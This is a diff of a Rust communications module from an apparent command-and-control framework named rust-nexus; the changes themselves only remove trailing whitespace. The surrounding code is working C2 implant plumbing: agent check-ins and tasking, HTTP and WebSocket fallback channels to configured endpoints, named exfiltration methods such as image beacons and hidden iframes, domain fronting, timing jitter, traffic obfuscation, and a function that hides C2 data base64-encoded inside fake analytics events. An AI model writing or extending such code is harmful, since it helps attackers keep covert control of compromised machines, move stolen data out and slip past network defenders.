@@ -1,5 +1,5 @@
 //! Nexus Web Communications Module
-//! 
+//!
 //! Provides HTTP/WebSocket fallback communication methods integrating catch system's
 //! data exfiltration techniques with rust-nexus's secure gRPC communication layer.
 
@@ -138,15 +138,15 @@ pub enum WebCommsMessage {
     AgentCheckin(AgentCheckinData),
     TaskRequest(String), // agent_id
     TaskResponse(TaskResponseData),
-    
+
     // Reconnaissance integration
     FingerprintData(FingerprintData),
     ReconResults(ReconResultsData),
-    
+
     // System messages
     Heartbeat(HeartbeatData),
     Error(ErrorData),
-    
+
     // Obfuscated data (appears as legitimate traffic)
     Analytics(AnalyticsData),
     Metrics(MetricsData),
@@ -254,16 +254,16 @@ impl WebCommsClient {
     /// Create a new web communications client
     pub fn new(config: WebCommsConfig) -> Result<Self> {
         let mut headers = reqwest::header::HeaderMap::new();
-        
+
         // Set default headers for legitimate appearance
         headers.insert(reqwest::header::ACCEPT, "application/json, text/plain, */*".parse().unwrap());
         headers.insert(reqwest::header::ACCEPT_LANGUAGE, "en-US,en;q=0.9".parse().unwrap());
         headers.insert(reqwest::header::ACCEPT_ENCODING, "gzip, deflate, br".parse().unwrap());
-        
+
         // Add domain fronting headers if enabled
         if config.domain_fronting.enabled {
             headers.insert(reqwest::header::HOST, config.domain_fronting.real_host.parse().unwrap());
-            
+
             for (key, value) in &config.domain_fronting.custom_headers {
                 headers.insert(
                     reqwest::header::HeaderName::from_bytes(key.as_bytes())
@@ -308,7 +308,7 @@ impl WebCommsClient {
                     Err(e) => {
                         warn!("HTTP send attempt {} to {} failed: {}", attempt + 1, endpoint, e);
                         last_error = Some(e);
-                        
+
                         if attempt < self.config.max_retries - 1 {
                             tokio::time::sleep(std::time::Duration::from_millis(
                                 1000 * (attempt + 1) as u64
@@ -327,13 +327,13 @@ impl WebCommsClient {
     /// Send HTTP message to specific endpoint using catch exfiltration techniques
     async fn send_http_to_endpoint(&self, endpoint: &str, message: &WebCommsMessage) -> Result<String> {
         use crate::http_fallback::HttpExfiltration;
-        
+
         let exfiltration = HttpExfiltration::new(&self.config);
-        
+
         // Try multiple exfiltration methods (like catch system)
         let methods = vec![
             "post_json",
-            "image_beacon", 
+            "image_beacon",
             "hidden_iframe",
             "fetch_api",
         ];
@@ -359,7 +359,7 @@ impl WebCommsClient {
 
         let serialized = serde_json::to_string(&message)
             .map_err(NexusError::SerializationError)?;
-        
+
         let obfuscated = if self.config.obfuscation.enabled {
             self.obfuscate_data(&serialized)?
         } else {
@@ -381,7 +381,7 @@ impl WebCommsClient {
     async fn establish_websocket_connection(&mut self) -> Result<()> {
         for endpoint in &self.config.primary_endpoints {
             let ws_url = endpoint.replace("http://", "ws://").replace("https://", "wss://") + "/ws";
-            
+
             match connect_async(&ws_url).await {
                 Ok((ws_stream, _)) => {
                     info!("WebSocket connected to {}", ws_url);
@@ -412,7 +412,7 @@ impl WebCommsClient {
 
                         let message: WebCommsMessage = serde_json::from_str(&deobfuscated)
                             .map_err(NexusError::SerializationError)?;
-                        
+
                         return Ok(Some(message));
                     }
                 }
@@ -439,14 +439,14 @@ impl WebCommsClient {
             .unwrap_or_default()
             .subsec_nanos() as u64;
         let jitter = self.config.jitter_ms.0 + (time_seed % jitter_range);
-        
+
         tokio::time::sleep(std::time::Duration::from_millis(jitter)).await;
     }
 
     /// Obfuscate data for transmission
     fn obfuscate_data(&self, data: &str) -> Result<String> {
         use crate::traffic_obfuscation::DataObfuscator;
-        
+
         let obfuscator = DataObfuscator::new(&self.config.obfuscation);
         obfuscator.obfuscate(data)
     }
@@ -454,7 +454,7 @@ impl WebCommsClient {
     /// Deobfuscate received data
     fn deobfuscate_data(&self, data: &str) -> Result<String> {
         use crate::traffic_obfuscation::DataObfuscator;
-        
+
         let obfuscator = DataObfuscator::new(&self.config.obfuscation);
         obfuscator.deobfuscate(data)
     }
@@ -485,15 +485,15 @@ impl WebCommsClient {
     /// Create a legitimate-looking message for obfuscation
     pub fn create_obfuscated_message(&self, data: &str) -> WebCommsMessage {
         use uuid::Uuid;
-        
+
         // Hide C2 data in analytics events
         let mut properties = HashMap::new();
         properties.insert("page_url".to_string(), "/dashboard".to_string());
         properties.insert("user_id".to_string(), Uuid::new_v4().to_string());
         properties.insert("session_duration".to_string(), "1234".to_string());
-        
+
         // Hide actual data in a property that looks legitimate
-        properties.insert("tracking_data".to_string(), 
+        properties.insert("tracking_data".to_string(),
             general_purpose::STANDARD.encode(data));
 
         WebCommsMessage::Analytics(AnalyticsData {
@@ -529,7 +529,7 @@ impl WebCommsClient {
             }
             _ => {}
         }
-        
+
         Ok(None)
     }
 }
@@ -548,7 +548,7 @@ impl WebCommsServer {
     /// Start the web communications server
     pub async fn start(&self, bind_address: &str, port: u16) -> Result<()> {
         use crate::http_fallback::HttpServer;
-        
+
         let server = HttpServer::new(self.config.clone());
         server.start(bind_address, port).await
     }
@@ -636,9 +636,9 @@ mod tests {
     fn test_obfuscated_message_creation() {
         let config = WebCommsConfig::default();
         let client = WebCommsClient::new(config).unwrap();
-        
+
         let message = client.create_obfuscated_message("secret data");
-        
+
         match message {
             WebCommsMessage::Analytics(analytics) => {
                 assert_eq!(analytics.events.len(), 1);
